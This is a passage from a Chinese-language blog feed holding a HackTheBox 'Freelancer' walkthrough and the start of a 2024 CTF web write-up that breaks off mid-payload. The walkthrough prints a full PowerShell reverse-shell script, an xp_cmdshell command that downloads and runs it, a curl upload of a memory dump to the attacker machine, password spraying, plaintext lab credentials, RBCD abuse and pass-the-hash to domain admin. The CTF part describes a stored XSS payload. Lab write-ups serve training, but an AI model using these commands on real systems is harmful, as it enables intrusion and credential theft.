class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49683/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49704/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Instance name: SQLEXPRESS</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|     TCP port: 55297</span><br><span class="line">|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query</span><br><span class="line">|_    Clustered: false</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-10-30T16:19:02</span><br><span class="line">|_Not valid after:  2054-10-30T16:19:02</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Target_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Domain_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Computer_Name: DC</span><br><span class="line">|     DNS_Domain_Name: freelancer.htb</span><br><span class="line">|     DNS_Computer_Name: DC.freelancer.htb</span><br><span class="line">|     DNS_Tree_Name: freelancer.htb</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line">|_ssl-date: 2024-10-30T16:23:30+00:00; +5h00m04s from scanner time.</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|Vista|10|2012|Longhorn|7|8.1|2016|11 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_8</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 2004 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-30T16:23:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 5h00m03s, deviation: 0s, median: 5h00m03s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1720/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   689.59 ms 10.10.16.1</span><br><span class="line">2   366.60 ms 10.10.11.5</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds</span><br></pre></td></tr></table></figure><p>开放若干端口，可以看到这是一台域控，根据80端口的结果，可以发现域名<code>freelancer.htb</code>，将其添加到<code>/etc/hosts</code>中，同时存在<code>SQL Server</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.11.5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030193421240-862466878.png" alt="image-20241030193415328"></p><p>smb没有重要信息</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195019202-355984579.png" alt="image-20241030195013398"></p><p>扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://freelancer.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030194522012-1201054933.png" alt="image-20241030194515723"></p><p>访问后还是没什么重要信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210922158-590770136.png" alt="image-20241030210916487"></p><p>随便点了篇文章发现url的数据像是用户的编号</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210950614-402962867.png" alt="image-20241030210944922"></p><p>测试后发现id为2的时候是admin用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195947536-985652884.png" alt="image-20241030195941232"></p><p>注册个自由账户登录后发现路由跳转到<code>/job/search/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030200358580-254071980.png" alt="image-20241030200352902"></p><p>发现还是没有登陆进去</p><p>在注册个员工账户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241103185552789-1784702947.png" alt="image-20241030201044315"></p><p>发现没激活不让登录，注意到两个账户登陆的表单是同一个，还有个忘记密码，尝试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030201435602-1815788951.png" alt="image-20241030201429836"></p><p>通过忘记密码功能成功以员工身份登录到后台</p><h1 id="获得网站admin权限"><a href="#获得网站admin权限" class="headerlink" title="获得网站admin权限"></a>获得网站admin权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203205421-979958180.png" alt="image-20241030203159702"></p><p>注意到有个QRcode，扫描一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203726339-1392968181.png" alt="image-20241030203720362"></p><p>有一个url，访问url会跳转到当前用户</p><p>注意到中间可能是base64编码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203803580-1093742398.png" alt="image-20241030203757961"></p><p>解码后发现是10012</p><p>之前知道 admin 的 id 是2，感觉可以尝试伪造一下</p><p><strong>ps: 注意每个QRcode生成的链接有时效性，需要在生成QRcode后就替换并访问（这里我试了好多次）</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030211612757-592831591.png" alt="image-20241030211606674"></p><p>获取到网站的admin权限</p><h1 id="MSSQL通过RCE获得shell"><a href="#MSSQL通过RCE获得shell" class="headerlink" title="MSSQL通过RCE获得shell"></a>MSSQL通过RCE获得shell</h1><p>当前页面并没有什么新的东西，之前目录扫描知道有admin路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031155340969-1949040649.png" alt="image-20241031155320549"></p><p>注意到右下角有个<code>SQL Terminal</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241103185612117-1781510714.png" alt="image-20241031160042048"></p><p>简单执行<code>select @@version;</code>发现可以执行sql语句</p><p>尝试利用sql的执行命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031161914233-762073518.png" alt="image-20241031160156445"></p><p>利用SQL枚举，尝试<code>xp_cmdshell</code></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands">Pentesting MSSQL</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162235113-1486071814.png" alt="image-20241031162228101"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> b.name <span class="keyword">FROM</span> sys.server_permissions a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals b <span class="keyword">ON</span> a.grantor_principal_id <span class="operator">=</span> b.principal_id <span class="keyword">WHERE</span> a.permission_name <span class="operator">=</span> <span class="string">&#x27;IMPERSONATE&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162246707-191596372.png" alt="image-20241031162238631"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162256855-652593550.png" alt="image-20241031162249651"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> xp_cmdshell whoami;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162307485-1009571644.png" alt="image-20241031162300569"></p><p>接着执行命令获取shell，但是测试后发现有杀软</p><p>准备一个ps1脚本（找了好久才找到，大多数都被杀了，人都麻了）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.ps1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.16.4&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031163434222-1715803624.png" alt="image-20241031163426947"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> xp_cmdshell <span class="string">&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031180128183-1871641448.png" alt="image-20241031180120472"></p><p>成功获得shell</p><h1 id="sql-svc-gt-mikasaAckerman"><a href="#sql-svc-gt-mikasaAckerman" class="headerlink" title="sql_svc-&gt;mikasaAckerman"></a>sql_svc-&gt;mikasaAckerman</h1><p>先简单查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031181451778-69892735.png" alt="image-20241031181444181"></p><p>在<code>C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU</code>目录下的<code>sql-Configuration.INI</code>文件中找到俩密码<code>IL0v3ErenY3ager</code>和<code>t3mp0r@ryS@PWD</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031182535485-866862623.png" alt="image-20241031182527902"></p><p>将<code>C:\Users</code>中的用户名保存到<code>users</code>文件中，密码保存至<code>passwd</code>文件中，尝试密码喷洒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb freelancer.htb -u <span class="built_in">users</span> -p passwd</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031183827237-1394554085.png" alt="image-20241031183819307"></p><p>找到一组正确的凭据<code>mikasaAckerman:IL0v3ErenY3ager</code></p><p>但是<code>winrm</code>并没有成功的凭据</p><p>使用<a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>进行横向，先上传至靶机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.4</span>/RunasCs.exe <span class="literal">-outfile</span> RunasCs.exe</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185139899-1944749946.png" alt="image-20241031185131983"></p><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe mikasaAckerman <span class="string">&quot;IL0v3ErenY3ager&quot;</span> <span class="literal">-d</span> freelancer.htb cmd <span class="literal">-r</span> <span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">8889</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185732331-1762507818.png" alt="image-20241031185724497"></p><p>成功获得<code>mikasaackerman</code>用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185853820-131256646.png" alt="image-20241031185846521"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><h1 id="mikasaAckerman-gt-lorra199"><a href="#mikasaAckerman-gt-lorra199" class="headerlink" title="mikasaAckerman-&gt;lorra199"></a>mikasaAckerman-&gt;lorra199</h1><p>在<code>mikasaAckerman</code>桌面还有两个文件，其中一个是压缩包</p><p>先看下<code>mail.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031190704941-974279194.png" alt="image-20241031190657225"></p><p>通过smb文件共享来传输文件，这里使用<code>httpuploadexfil</code>工具实现 </p><p>先在攻击机建立监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./httpuploadexfil :9999 /root/HackTheBox/Freelancer/share</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192056276-848032017.png" alt="image-20241031192048419"></p><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="operator">-F</span> <span class="string">&quot;file=@MEMORY.7z&quot;</span> http://<span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">9999</span>/p</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192808087-2027884009.png" alt="image-20241031192800564"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031193202144-454390878.png" alt="image-20241031193154701"></p><p>解压后发现是个 <code>DMP</code>文件</p><p>使用<a href="https://github.com/ufrisk/MemProcFS">MemProcFS</a>进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./memprocfs -device /root/HackTheBox/Freelancer/share/MEMORY.DMP -mount /root/HackTheBox/Freelancer/dmp_mnt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194502165-752955147.png" alt="image-20241031194454182"></p><p>将其挂载到一个空目录，在切换终端查看该目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194557174-879320302.png" alt="image-20241031194549629"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194716386-270783784.png" alt="image-20241031194708714"></p><p>发现在<code>registry/hive_files</code>目录下找到SAM、SYSTEM和SECURITY文件</p><p>使用<code>secretsdump</code>导出hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194947565-950391359.png" alt="image-20241031194939897"></p><p>发现在最下面有一串明文密码<code>PWN3D#l0rr@Armessa199</code></p><p>继续尝试密码喷洒</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031195259082-1047005503.png" alt="image-20241031195251538"></p><p>找到一组凭据<code>lorra199:PWN3D#l0rr@Armessa199</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201223159-1255973466.png" alt="image-20241031201215390"></p><p>winrm发现也可以使用，直接使用<code>evil-winrm</code>登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201409985-1471373558.png" alt="image-20241031201402294"></p><p>成功登录<code>lorra199</code>用户</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="bloodhound信息收集"><a href="#bloodhound信息收集" class="headerlink" title="bloodhound信息收集"></a>bloodhound信息收集</h2><p>先使用<code>bloodhound-python</code>信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.11.5 --dns-tcp -d freelancer.htb -u lorra199 -p PWN3D<span class="comment">#l0rr@Armessa199 -c All --zip</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031202047153-583515341.png" alt="image-20241031202039091"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031204334572-282778564.png" alt="image-20241031204327239"></p><p>发现<code>lorra199</code>用户属于<code>AD RECYCLE BIN</code>组</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205200402-623938844.png" alt="image-20241031205153099"></p><p>同时还注意到<code>AD RECYCLE BIN</code>组对<code>DC</code>有<code>GenericWrite</code>权限，可以修改该账户的属性，包括设置或更改允许委派到的服务列表，这可以间接实现约束委派（RBCD）</p><h2 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h2><blockquote><p>在计算机对象上滥用 <code>GenericWrite</code> 的一种方法是在域上创建一台假计算机，然后写入 DC，该假计算机能够作为 DC 进行委派（使用基于资源的约束委派 （RBCD））。然后，我可以作为 DC 请求票证并充当 DC。</p></blockquote><ul><li>添加计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;Ya$&#x27;</span> -computer-pass <span class="string">&#x27;Aa123456!&#x27;</span> -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:<span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205840693-1296189239.png" alt="image-20241031205832864"></p><ul><li>使用RBCD，如果这台 PC 属于“域管理员”组，我们将授予它冒充为用户“管理员”的权限</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbcd.py -delegate-from <span class="string">&#x27;Ya$&#x27;</span> -delegate-to <span class="string">&#x27;DC$&#x27;</span> -dc-ip 10.10.11.5 -action <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031210246405-289400388.png" alt="image-20241031210239085"></p><ul><li>使用getST获取服务票证以访问服务CIFS</li></ul><p>在请求票据之前，先与服务器时间同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s freelancer.htb</span><br></pre></td></tr></table></figure><p>再请求票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&#x27;cifs/dc.freelancer.htb&#x27;</span> -dc-ip 10.10.11.5 -impersonate <span class="string">&#x27;administrator&#x27;</span> <span class="string">&#x27;freelancer.htb/Ya:Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211232406-563143332.png" alt="image-20241031211224615"></p><p>导入票据，然后使用secretdump获取hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="string">&#x27;freelancer.htb/Administrator@DC.freelancer.htb&#x27;</span> -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntl</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211643068-790736658.png" alt="image-20241031211635032"></p><p>最后<code>evil-winrm</code>登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i freelancer.htb -u administrator -H <span class="string">&#x27;0039318f1e8274633445bce32ad1a290&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211735148-656830288.png" alt="image-20241031211727679"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211810839-438087994.png" alt="image-20241031211803217"></p><p>在<code>Desktop</code>找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 青龙组 2024</title>
      <link href="/posts/f29ac13a.html"/>
      <url>/posts/f29ac13a.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WEB02："><a href="#WEB02：" class="headerlink" title="WEB02："></a>WEB02：</h2><p>访问该环境，登陆注册能随便登，会返回一个/content/hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180453448-634328005.png" alt="image-20241030180447239"></p><p>进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180459681-135067479.png" alt="image-20241030180453738"></p><p>之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180509840-252441728.png" alt="image-20241030180503515"></p><p>之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180524353-506826609.png" alt="image-20241030180518438"></p><p>所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180530487-2088539579.png" alt="image-20241030180524536"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fetch</span>(<span 